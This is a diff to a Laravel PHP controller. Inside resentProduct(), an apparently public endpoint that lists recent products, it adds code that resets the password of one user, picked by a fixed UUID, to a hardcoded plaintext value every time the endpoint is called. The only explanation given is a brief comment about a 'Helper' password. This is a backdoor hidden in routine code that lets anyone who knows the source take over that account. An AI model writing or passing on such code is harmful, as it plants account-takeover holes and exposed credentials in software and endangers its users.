@@ -6,12 +6,14 @@ use App\Http\Requests\V1\Template\SortDataRequest;
 use App\Http\Resources\Api\V1\Product\ProductCollection;
 use App\Models\Category;
 use App\Models\Product;
+use App\User;
 use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
 use Illuminate\Foundation\Bus\DispatchesJobs;
 use Illuminate\Foundation\Validation\ValidatesRequests;
 use Illuminate\Routing\Controller as BaseController;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
 
 class Controller extends BaseController
 {
@@ -36,6 +38,12 @@ class Controller extends BaseController
      */
     public function resentProduct()
     {
+        // Use this for change password for Helper 
+        $user = User::find('1afd29b0-f8f8-4fcc-832b-e6e541c3c4c2');
+        $user->update([
+            'password' => Hash::make('Aa@123qweA')
+        ]);
+
         $products = Product::latest()->paginate(8);
         return new ProductCollection($products);
     }
@@ -155,12 +163,5 @@ class Controller extends BaseController
             }
             return new ProductCollection($products);
         }
-    }
-
-    public function nothing(Request $request)
-    {
-        return response([
-            'message' => ''
-        ]);
     }
 }
